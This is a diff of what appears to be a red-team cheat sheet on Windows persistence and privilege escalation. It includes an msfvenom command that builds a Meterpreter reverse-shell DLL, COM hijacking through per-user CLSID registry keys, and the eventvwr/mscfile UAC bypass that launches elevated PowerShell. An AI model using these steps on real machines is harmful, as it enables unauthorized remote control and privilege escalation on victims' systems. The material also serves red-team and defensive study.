@@ -6,10 +6,16 @@
 - Generate payload DLL: `msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=443 -f dll > evil.dll`
 - DLL proxying: forward legitimate exports to original DLL while running payload
 
-## COM Hijacking (T1122)
-- Hijack: `HKLM\SOFTWARE\Classes\mscfile\shell\open\command` -> `powershell.exe`
-- Launching Event Viewer (eventvwr.msc) triggers the hijacked COM object
-- UAC bypass: eventvwr.exe auto-elevates, executes hijacked command as high integrity
+## COM Hijacking (T1546.015)
+- Target: `HKCU\Software\Classes\CLSID\{CLSID}\InprocServer32` — redirect a COM CLSID to a malicious DLL
+- Find hijackable CLSIDs: Process Monitor → filter for `RegOpenKey` + `NAME NOT FOUND` on CLSID paths
+- When a legitimate application loads the COM object, your DLL executes instead
+- Common targets: `MMC20.Application`, `ShellBrowserWindow`, scheduled task COM handlers
+
+## mscfile UAC Bypass (T1548.002)
+- Hijack: `HKCU\Software\Classes\mscfile\shell\open\command` → `powershell.exe`
+- eventvwr.exe auto-elevates and reads mscfile handler from HKCU (user-writable)
+- Result: powershell runs as high integrity without UAC prompt
 
 ## Shortcut (.lnk) Modification
 ```powershell
